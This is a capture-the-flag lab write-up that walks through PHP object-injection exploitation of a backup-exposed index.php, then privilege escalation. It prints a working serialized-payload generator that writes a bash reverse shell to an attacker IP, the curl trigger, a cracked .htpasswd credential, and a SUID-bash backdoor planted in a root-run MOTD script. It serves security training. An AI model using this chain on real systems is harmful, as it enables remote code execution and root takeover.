Let's check the web application first:

![](images/Pasted%20image%2020250407133430.png)

Source code is the default one too, we need to fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.109.3/FUZZ" -ic -c -t 200

       v2.1.0-dev

We got a `backup` file, let's check it out:

![](images/Pasted%20image%2020250407133732.png)

We got the `index.php.bak` file, we can visualize the contents of it in order to check for anything unusual:

![](images/Pasted%20image%2020250407134134.png)

![](images/Pasted%20image%2020250407134241.png)

This is highly vulnerable, due to this:

- An attacker can craft a malicious serialized payload and pass it via the `debug` GET parameter (e.g., `?debug=PAYLOAD`).
- The `unserialize()` function will reconstruct the object, triggering the `__destruct()` method of the `FormSubmit` class (or any other class if gadgets exist).
- **Arbitrary File Write**: By controlling `$form_file` and `$message`, an attacker could:
	- Overwrite critical files (e.g., `.htaccess`, `index.php`).       
	- Write a PHP web shell (e.g., `<?php system($_GET['cmd']); ?>`) to gain RCE.


Knowing this, we can proceed to exploitation.


# EXPLOITATION
---

We can do the following:

1. Create a `generate_payload.php` file:

```
<?php
class FormSubmit {
    public $form_file;
    public $message;
}

$payload = new FormSubmit();
$payload->form_file = 'shell.php'; // Filename to create
$payload->message = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/IP/4444 0>&1\'"); ?>'; // Reverse shell

echo urlencode(serialize($payload));
?>
```

2. Use the `generate_payload.php` file:

```
php generate_payload.php
```

This will output a URL encoded payload, for example:

```
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.6.34.159%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

Now, use curl to upload the reverse shell:

```
curl "http://10.10.109.3/index.php?debug=GENERATED_PAYLOAD"
```

![](images/Pasted%20image%2020250407135556.png)

It will upload the file successfully and we can get the reverse shell by visiting:

```
http://TARGET_IP/shell.php
```


If we check our listener, we get the connection:

![](images/Pasted%20image%2020250407135634.png)

Let's proceed with privilege escalation.



# PRIVILEGE ESCALATION
---


We can begin by stabilizing our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](images/Pasted%20image%2020250407135735.png)

We can find this inside of `/var/www/html`:

![](images/Pasted%20image%2020250407141523.png)

We got a `.htpasswd` file:

```
www-data@osboxes:/var/www/html$ cat .htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

We can crack it using john:

```
echo 'james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1' > hash.txt
```

```
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

jamaica          (james)
```

We got credentials, let's go into ssh:

```
james:jamaica
```

![](images/Pasted%20image%2020250407141902.png)

```
james@osboxes:~$ cat user.txt
7e37c84a66cc40b1c6bf700d08d28c20
```

We got a `Note_to_james.txt` file:

```
james@osboxes:~$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it?

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :)

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

The `/etc/update-motd.d/` directory contains the scripts that generate the MOTD that's displayed on the ssh login, we can check if we are actually able to modify that and if root owns this:

```
ls -ld /etc/update-motd.d/
ls -l /etc/update-motd.d/
```

![](images/Pasted%20image%2020250407142343.png)

We can modify any of these files to add either a reverse shell or create a SUID binary `, let's for example modify the `99-esm` file:

```
chmod u+s /bin/bash
```

```
cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD

chmod u+s /bin/bash
```

Now, we need to log into ssh again to trigger the payload:

```
ssh james@IP

Once logged use: /bin/bash -p
```

We can see this:

![](images/Pasted%20image%2020250407143046.png)

There we go, we got root, let's read final flag:

```
bash-4.3# cat /root/root.txt
3c8c3d0fe758c320d158e32f68fabf4b
```
